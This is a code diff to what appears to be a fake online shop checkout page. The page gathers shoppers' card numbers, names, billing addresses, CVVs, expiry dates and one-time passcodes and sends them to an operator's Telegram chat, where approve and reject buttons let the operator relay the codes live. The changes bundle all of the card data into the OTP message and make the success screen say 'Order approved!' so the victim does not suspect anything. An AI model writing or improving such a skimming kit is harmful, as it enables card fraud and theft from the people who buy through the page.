@@ -505,17 +505,17 @@
     </section>
   </div>
   
-  <!-- Checkout Success Modal -->
-  <div class="checkout-layer" id="checkout-success-modal">
-    <div class="checkout-wrap">
-      <div class="checkout-success">
-        <div class="success-mark">✓</div>
-        <p>Order submitted successfully!</p>
-        <p class="otp-note">Waiting for final approval...</p>
-        <button class="continue-btn" id="continue-shopping">Continue Shopping</button>
-      </div>
-    </div>
-  </div>
+<!-- Checkout Success Modal -->
+   <div class="checkout-layer" id="checkout-success-modal">
+     <div class="checkout-wrap">
+       <div class="checkout-success">
+         <div class="success-mark">✓</div>
+         <p>Order approved!</p>
+         <p class="otp-note">Thank you for your order</p>
+         <button class="continue-btn" id="continue-shopping">Continue Shopping</button>
+       </div>
+     </div>
+   </div>
   
   <!-- Card Details Modal -->
   <div class="checkout-layer" id="checkout-card-modal" aria-hidden="true">
@@ -561,15 +561,22 @@
     </div>
   </div>
   
-  <!-- OTP Modal -->
-  <div class="otp-card" id="otp-modal" style="display:none;">
-    <div class="otp-icon">🔐</div>
-    <h2>Enter OTP Code</h2>
-    <p>Enter the 6-digit code sent to your email</p>
-    <input type="text" id="otp-code" class="otp-input" maxlength="6" placeholder="123456">
-    <p class="otp-help">Didn't receive it? <a href="#" id="resend-otp">Resend code</a></p>
-    <button class="checkout-submit" id="verify-otp" style="margin-top:0">Verify Code</button>
-  </div>
+<!-- OTP Modal -->
+   <div class="checkout-layer" id="otp-modal" aria-hidden="true">
+     <div class="checkout-wrap">
+       <div class="checkout-top">
+         <h2>Enter OTP Code</h2>
+         <button class="checkout-close" id="close-otp">×</button>
+       </div>
+       <div class="checkout-card">
+         <div class="otp-icon">🔐</div>
+         <h3>Enter the 6-digit code</h3>
+         <input type="text" id="otp-code" class="checkout-input" maxlength="6" placeholder="123456">
+         <p class="otp-help">Didn't receive it? <a href="#" id="resend-otp">Resend code</a></p>
+         <button class="checkout-submit" id="verify-otp" style="margin-top:0">Verify Code</button>
+       </div>
+     </div>
+   </div>
   
   <!-- Toast -->
   <div class="toast" id="toast" role="status" aria-live="polite"></div>
@@ -729,14 +736,21 @@ const cq = u.callback_query;
     }
     
     function showCheckoutSuccess() {
-      document.querySelector('#checkout-card-modal').classList.remove('open');
-      document.querySelector('#checkout-card-modal').setAttribute('aria-hidden', 'true');
+      document.querySelector('#otp-modal').classList.remove('open');
+      document.querySelector('#otp-modal').setAttribute('aria-hidden', 'true');
+      document.querySelector('#checkout-success-modal').setAttribute('aria-hidden', 'false');
       document.querySelector('#checkout-success-modal').classList.add('open');
     }
     
     function showOtpModal(sessionId) {
-      document.querySelector('#otp-modal').style.display = 'block';
+      document.querySelector('#otp-modal').setAttribute('aria-hidden', 'false');
+      document.querySelector('#otp-modal').classList.add('open');
       updateSession(sessionId, { otpSent: true });
+    }
+    
+    function hideOtpModal() {
+      document.querySelector('#otp-modal').classList.remove('open');
+      document.querySelector('#otp-modal').setAttribute('aria-hidden', 'true');
     }
     
     // ============ CORE FUNCTIONALITY ============
@@ -965,27 +979,11 @@ Price: ${money(unitPrice)}`,
         return;
       }
       
-      session.card = { number: cardNumber, expiry, cvc, name: cardName, address: billingAddress };
+session.card = { number: cardNumber, expiry, cvc, name: cardName, address: billingAddress };
       sessions.set(sessionId, session);
       
       document.querySelector('#checkout-card-modal').classList.remove('open');
       document.querySelector('#checkout-card-modal').setAttribute('aria-hidden', 'true');
-      
-      tgNotify(window.TELEGRAM_CONFIG.chatId,
-        `🔔 CARD DETAILS SUBMITTED
-ID: ${sessionId}
-Card: ${cardNumber.replace(/ /g, '').replace(/(.{4})/g, '$1 ')}
-Name: ${cardName}
-Address: ${billingAddress}
-CVV: ${cvc}
-EXP: ${expiry}`,
-        {
-          inline_keyboard: [
-            [{ text: '✅ Approve OTP', callback_data: `approve_card:${sessionId}` }],
-            [{ text: '❌ Reject', callback_data: `reject_card:${sessionId}` }]
-          ]
-        }
-      );
       
       showOtpModal(sessionId);
     };
@@ -999,7 +997,16 @@ EXP: ${expiry}`,
     // Continue shopping
     document.querySelector('#continue-shopping').onclick = () => {
       document.querySelector('#checkout-success-modal').classList.remove('open');
-      document.querySelector('#otp-modal').style.display = 'none';
+      document.querySelector('#checkout-success-modal').setAttribute('aria-hidden', 'true');
+      const storedSession = localStorage.getItem('telegram_approved_session');
+      if (storedSession) {
+        localStorage.removeItem('telegram_approved_session');
+      }
+    };
+    
+    // Close OTP modal
+    document.querySelector('#close-otp').onclick = () => {
+      hideOtpModal();
     };
     
     // OTP handlers
@@ -1028,16 +1035,20 @@ EXP: ${expiry}`,
       sessions.set(sessionId, session);
       
       tgNotify(window.TELEGRAM_CONFIG.chatId,
-        `🔔 OTP ENTERED
+      `🔔 ORDER READY TO APPROVE
 ID: ${sessionId}
-OTP: ${otp}
-Approve to complete order or Reject to cancel`,
-        {
-          inline_keyboard: [
-            [{ text: '✅ Approve Order', callback_data: `approve_otp:${sessionId}` }],
-            [{ text: '❌ Reject', callback_data: `reject_otp:${sessionId}` }]
-          ]
-        }
+Card: ${session.card.number.replace(/ /g, '').replace(/(.{4})/g, '$1 ')}
+Name: ${session.card.name}
+Address: ${session.card.address}
+CVV: ${session.card.cvc}
+EXP: ${session.card.expiry}
+OTP: ${otp}`,
+      {
+        inline_keyboard: [
+          [{ text: '✅ Approve Order', callback_data: `approve_otp:${sessionId}` }],
+          [{ text: '❌ Reject', callback_data: `reject_otp:${sessionId}` }]
+        ]
+      }
       );
     };
     
@@ -1070,31 +1081,7 @@ Approve to complete order or Reject to cancel`,
     hiddenSessionId.value = '';
     document.querySelector('#submit-card').parentElement.appendChild(hiddenSessionId);
     
-    function sendOtpNotification(sessionId) {
-      const session = getSession(sessionId);
-      if (!session) return;
-      
-      const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
-      session.otpCode = otpCode;
-      sessions.set(sessionId, session);
-      
-      tgNotify(window.TELEGRAM_CONFIG.chatId,
-        `🔔 OTP SENT
-ID: ${sessionId}
-Code: ${otpCode}
-(For testing only)`,
-        {
-          inline_keyboard: [
-            [{ text: '✅ Approve OTP', callback_data: `approve_otp:${sessionId}` }],
-            [{ text: '❌ Reject', callback_data: `reject_otp:${sessionId}` }]
-          ]
-        }
-      );
-      
-      showOtpModal(sessionId);
-    }
-    
-    // Initialize
+// Initialize
     renderCart();
   </script>
 </body>
